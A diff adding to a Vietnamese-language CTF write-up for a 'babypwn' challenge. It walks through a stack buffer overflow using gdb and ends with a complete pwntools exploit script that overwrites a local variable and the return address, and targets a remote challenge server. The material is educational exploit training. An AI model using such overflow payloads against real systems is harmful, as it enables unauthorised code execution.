@@ -196,5 +196,77 @@ Thông qua việc xác định `RBP`, `RSP` ta sẽ có thể dễ dàng hình d
 
 > *Ghi chú: Trong đa số các bộ vi xử lý (CPU) thì 1 địa chỉ sẽ đại diện cho 8 bits. Mỗi byte trong bộ nhớ sẽ có 1 địa chỉ riêng biệt*  
 >
-> rbp - 4 chính là bằng `0x7ffe6f929600 - 4 = 0x7ffe6f9295fc`, đây là địa chỉ của chữ A đầu tiên, 4 bytes từ địa chỉ này sẽ là AAAA
+> rbp - 4 chính là bằng `0x7ffe6f929600 - 4 = 0x7ffe6f9295fc`, đây là địa chỉ của chữ A đầu tiên, 4 bytes từ địa chỉ này sẽ là AAAA  
+>
+> Bạn có thể đọc thêm về cách hiển thị memory address trong gdb tại [đây](https://bob.cs.sonoma.edu/IntroCompOrg-RPi/sec-gdb1.html)
+
+Giờ đã xác định được vị trí của biến `v5` ta sẽ tiến hành sửa script lại để làm tràn `"0xcafe"` vào biến `v5`  
+
+Ta có thể viết là  
+
+```py 
+payload = [
+	b"a"*28,
+	p32(0xcafe), # hay b"\xfe\xca" đều được 
+]
+```
+
+Save và chạy lại đoạn script, trong trình gdb `n` liên tục thì sẽ thây lúc này chương trình đã nhảy vào hàm `helloUser`  
+
+![image](https://user-images.githubusercontent.com/74854445/134931648-481d860e-a89b-469e-80b7-9ce08b7a34cc.png)
+
+Thăm dò vị trí của `return address` tương tự như trên rồi viết thêm payload cho input của hàm `helloUser` là sẽ được script hoàn chỉnh như sau
+
+## Script Exploit  
+
+```py  
+from pwn import *
+
+#Dòng này sẽ giúp tin nhận hay gửi tin trong quá trình chạy script sẽ được in hết ra màn hình không cần phải dùng print() nữa
+context.log_level = 'debug'
+
+#Đoạn này dùng khi tương tác với file binary
+#elf = ELF("./babypwn")
+#p = elf.process()
+
+#Đoạn này dùng khi tương tác với server
+host = "185.239.107.54" 
+port = 7010
+p = remote(host,port)
+ 
+p.recvuntil("\n")
+p.recvuntil("\n")
+p.recvuntil("\n")
+p.recvuntil("\n")
+p.recvuntil("\n")
+p.recvuntil("\n")
+p.recvuntil("\n")
+p.recvuntil("\n")
+
+payload = [
+	b"A"*28,
+	p64(0xcafe)
+]
+
+payload = b"".join(payload)
+
+payload2 = [
+	b"a"*128,
+	b"A"*8, 
+	p64(0x4012ec)
+]
+
+payload2 = b"".join(payload2)
+
+#Khi tương tác với server thì phải bỏ gdb.attach đi
+#gdb.attach(p, """b *helloUser""")
+
+p.sendline(payload)
+p.sendline(payload2)
+p.interactive()
+```
+
+
+
+
 
